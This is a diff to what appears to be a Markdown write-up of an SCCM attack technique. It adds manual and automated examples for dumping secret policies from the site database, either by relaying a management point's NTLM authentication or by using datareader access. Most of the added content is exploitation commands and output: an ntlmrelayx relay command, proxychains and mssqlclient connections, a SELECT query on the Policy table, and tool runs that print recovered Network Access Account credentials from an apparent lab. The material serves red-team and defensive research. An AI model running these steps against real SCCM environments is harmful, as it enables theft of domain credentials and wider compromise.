@@ -33,6 +33,8 @@ The site database and MP are not hosted on the same host.
 ## Summary
 Management point computer accounts are granted the `smsdbrole_MP` database role on the site database, which provides EXEC permissions on various stored procedures (SPs). One of these SPs is `MP_GetPolicyBody`, which returns a hex-encoded blob containing the body of the policy. Then, the policy can be decoded, revealing the cleartext policy which contains encrypted credential blobs. Lastly, the credential blob can be decrypted using PXEThief, leading to the extraction of any and all credentials configured in OSD, including task sequence variables.
 
+> Note: A user with `dbo.datareader` or similar read access to the site database, while unable to execute those SPs, can still extract policies with a `SELECT` statement. More details in the Examples section below. 
+
 ## Impact
 In environments using Active Directory defaults, SCCM defaults, and any SCCM credentials distributed via machine policy (e.g., NAA,  collection variables, task sequence variables, RunAs accounts, OSD domain join accounts), any domain-authenticated user may coerce authentication from the remote management point, relay it to the site database, execute the SP to dump the policy body, then decrypt the credential material.
 
@@ -48,6 +50,11 @@ If any of these credentials are privileged, as they often unncessarily are, this
 
 
 ## Examples
+
+### Management Point Relay to Site Database
+
+#### Manual exploitation
+
 1. Setup `ntlmrelayx.py` to target the site database and establish a SOCKS session in the context of the relayed account
 ```
 ntlmrelayx.py -ts -t mssql://10.3.10.13 -socks -smb2support
@@ -239,6 +246,119 @@ PXE Password: ludus\sccm_naa
 
 [+] Decrypt stored PXE password from SCCM DP registry key Reserved1
 PXE Password: Password123
+```
+
+#### Automated exploitation
+
+1. After establishing your relay with a SOCKS proxy, connect to the site DB with `mssqlkaren` in the context of a MP
+```
+proxychains -q uv run mssqlkaren.py SCCMLAB/MECM\$@10.6.10.42 -no-pass -windows-auth
+Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies
+
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(MSSQL): Line 1: Changed database context to 'master'.
+[*] INFO(MSSQL): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2000  (8.0.341)
+[!] Press help for extra shell commands
+SQL (SCCMLAB\MECM$  dbo@master)>
+```
+
+2. Switch to the site DB
+```
+SQL (SCCMLAB\MECM$  dbo@master)> use CM_P01
+ENVCHANGE(DATABASE): Old Value: master, New Value: CM_P01
+INFO(MSSQL): Line 1: Changed database context to 'CM_P01'.
+SQL (SCCMLAB\MECM$  dbo@CM_P01)>
+```
+
+3. Speak to the manager to automatically pull down policies, decode, and deobfuscate/decrypt them
+```
+SQL (SCCMLAB\MECM$  dbo@CM_P01)> speak_to_the_manager
+[*] Querying for x64 unknown computer guid
+[*] Querying for Policy Assignments
+[*] Querying for policy bodies
+[+] Found NAA Policy
+[!] Network Access Account Username: 'sccm.lab\sccm-naa'
+[!] Network Access Account Password: '123456789'
+[+] Found NAA Policy
+[!] Network Access Account Username: 'sccm.lab\sccm-naa'
+[!] Network Access Account Password: '123456789'
+[+] Found Task Sequence policy
+[!] successfully deobfuscated task sequence
+[+] task sequence policy saved to karen/deobfuscated/ts_sequence_1b1da59b95c443d1ef6d49565a66d278.xml
+[+] Found Task Sequence policy
+[!] successfully deobfuscated task sequence
+[+] task sequence policy saved to karen/deobfuscated/ts_sequence_1b1da59b95c443d1ef6d49565a66d278.xml
+```
+
+### Policy Extraction with Database Read Access
+
+If you have read access to the site database and `Policy` table, for example via compromising or relaying a service account with `dbo.datareader` access, you can query policies directly even though you cannot execute stored procedures.
+
+#### Manual exploitation
+
+1. Connect to the database with your relayed or compromised account and pull the secret policies. The output can be very large - it is best to save it to a file
+```
+mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@10.6.10.42 -windows-auth -c 'USE CM_P01; SELECT PolicyID, Body FROM Policy WHERE PolicyFlags & 2 > 0 AND ISNULL(DATALENGTH(Body), 0) > 0' | tee policies.txt
+Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(MSSQL): Line 1: Changed database context to 'master'.
+[*] INFO(MSSQL): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
+SQL> USE CM_P01; SELECT PolicyID, Body FROM Policy WHERE PolicyFlags & 2 > 0 AND ISNULL(DATALENGTH(Body), 0) > 0
+ENVCHANGE(DATABASE): Old Value: master, New Value: CM_P01
+INFO(MSSQL): Line 1: Changed database context to 'CM_P01'.
+PolicyID                                       Body
+--------------------------------------   ----------
+{a0ff0c62-bed6-49ca-950b-e0a41ace3bc0}   b'fffe3c003f0078006d006c002000760065007200730069006f006e003d00220031002e003000220020003f003e000d000a003c0050006f006c00690063007900200050006f006c0069006300790054007<SNIPPED>
+```
+
+2. Decode and decrypt the policies as shown in the MP Relay manual exploitation section
+
+#### Automated exploitation
+
+1. Connect to the database with your relayed or compromised account using `mssqlkaren`
+```
+uv run mssqlkaren.py "$DOMAIN"/"$USER":"$PASSWORD"@10.6.10.42 -windows-auth
+Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(MSSQL): Line 1: Changed database context to 'master'.
+[*] INFO(MSSQL): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (SCCMLAB\dave  guest@master)>
+```
+
+2. Yell at the manager to automatically pull down policies, decode, and deobfuscate/decrypt them 
+```
+SQL (SCCMLAB\dave  guest@master)> yell_at_the_manager
+[*] Not in an SCCM database, searching for CM_* databases...
+[+] Found SCCM database: CM_P01
+[*] Querying secret policies from Policy table
+[+] Found 2 secret policies
+[+] Found NAA Policy
+[!] Network Access Account Username: 'sccm.lab\sccm-naa'
+[!] Network Access Account Password: '123456789'
+[+] Found NAA Policy
+[!] Network Access Account Username: 'sccm.lab\sccm-naa'
+[!] Network Access Account Password: '123456789'
+[+] Found Task Sequence policy
+[!] Successfully deobfuscated task sequence
+[+] Task sequence policy saved to karen/deobfuscated/ts_sequence_1b1da59b95c443d1ef6d49565a66d278.xml
+[+] Found Task Sequence policy
+[!] Successfully deobfuscated task sequence
+[+] Task sequence policy saved to karen/deobfuscated/ts_sequence_1b1da59b95c443d1ef6d49565a66d278.xml
+SQL (SCCMLAB\dave  SCCMLAB\dave@CM_P01)>
 ```
 
 ## References
